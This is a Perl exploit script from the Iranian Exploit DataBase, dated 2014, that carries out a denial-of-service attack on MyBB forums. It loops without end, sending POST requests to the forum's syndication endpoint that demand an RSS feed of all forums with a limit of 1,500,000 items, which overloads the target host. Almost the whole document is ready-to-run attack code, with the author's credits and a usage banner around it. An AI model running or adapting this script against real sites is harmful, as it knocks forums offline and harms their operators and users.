

# Mybb All Version Denial of Service Vulnerability

#!/usr/bin/perl

# Iranian Exploit DataBase
# Mybb All Version Denial of Service Vulnerability
# Test on Mybb 1.6.12
# Vendor site : www.mybb.com
# Code Written By Amir - iedb.team () gmail com - o0_shabgard_0o () 
yahoo com
# Site : Www.IeDb.Ir/acc   -   Www.IrIsT.Ir
# Fb Page : https://www.facebook.com/iedb.ir
# Greats : Medrik - Bl4ck M4n - ErfanMs - TaK.FaNaR  - F () riD - N20 - 
Bl4ck N3T - 0x0ptim0us - 0Day
# E2MA3N - l4tr0d3ctism - H-SK33PY - sole sad - r3d_s0urc3 - Dr_Evil - 
z3r0 - Mr.Zer0 - one alone hacker
# DICTATOR - dr.koderz - E1.Coders - Security - ARTA - ARYABOD - Behnam 
Vanda - C0dex - Dj.TiniVini
# Det3cT0r - yashar shahinzadeh And All Members In IeDb.Ir/acc
#####################################
use Socket;
if (@ARGV < 2) { &usage }
$rand=rand(10);
$host = $ARGV[0];
$dir = $ARGV[1];
$host =~ s/(http:\/\/)//eg;
for ($i=0; $i<10; $i--)
{
$data = 
"forums%5B%5D=all&version=rss2.0&limit=1500000&make=%D8%AF%D8%B1%DB%8C%D8%A7%D9%81%D8%AA+%D9%84%DB%8C%D9%86%DA%A9+%D9%BE%DB%8C%D9%88%D9%86%D8%AF+%D8%B3%D8%A7%DB%8C%D8%AA%DB%8C";
$len = length $data;
$foo = "POST ".$dir."misc.php?action=syndication HTTP/1.1\r\n".
"Accept: * /*\r\n".
"Accept-Language: en-gb\r\n".
"Content-Type: application/x-www-form-urlencoded\r\n".
"Accept-Encoding: gzip, deflate\r\n".
"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n".
"Host: $host\r\n".
"Content-Length: $len\r\n".
"Connection: Keep-Alive\r\n".
"Cache-Control: no-cache\r\n\r\n".
"$data";
my $port = "80";
my $proto = getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto);
connect(SOCKET, sockaddr_in($port, inet_aton($host))) || redo;
send(SOCKET,"$foo", 0);
syswrite STDOUT, "+" ;
}
print "\n\n";
system('ping $host');
sub usage {
print "################################################# \n";
print "##       Mybb All Version Denial of Service Vulnerability\n";
print "## Discoverd By Amir - iedb.team () gmail com - Id : 
o0_shabgard_0o \n";
print "##      Www.IeDb.Ir/acc   -   Www.IrIsT.Ir \n";
print "################################################# \n";
print "## [host] [path] \n";
print "## http://host.com /mybb/\n";
print "################################################# \n";
exit();
};
#####################################
#  Archive Exploit = http://www.iedb.ir/exploits-1332.html
#####################################

###########################

# Iranian Exploit DataBase = http://IeDb.Ir [2014-02-12]

###########################
